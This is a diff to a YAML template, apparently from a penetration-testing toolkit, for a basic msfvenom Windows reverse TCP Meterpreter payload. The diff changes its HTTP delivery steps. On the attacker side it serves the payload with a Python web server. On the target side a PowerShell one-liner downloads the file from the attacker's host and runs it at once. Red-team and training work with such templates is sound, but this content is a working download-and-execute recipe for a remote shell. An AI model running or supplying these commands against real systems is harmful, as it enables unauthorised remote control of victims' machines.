@@ -1,5 +1,5 @@
 meta:
-  name: "Basic Msfvenom Reverse TCP Shell"
+  name: "Basic Msfvenom Reverse TCP Shell*"
   category: ""
   description: |
     Generates a basic Windows reverse TCP Meterpreter payload using msfvenom.
@@ -64,12 +64,12 @@ output:
     ## HTTP Method
     **Attacker:**
     ```bash
-    python3 -m http.server 8000
+    python3 -m http.server 80
     ```
 
     **Target:**
     ```powershell
-    powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
     ```
 
     ## Alternative (SMB)
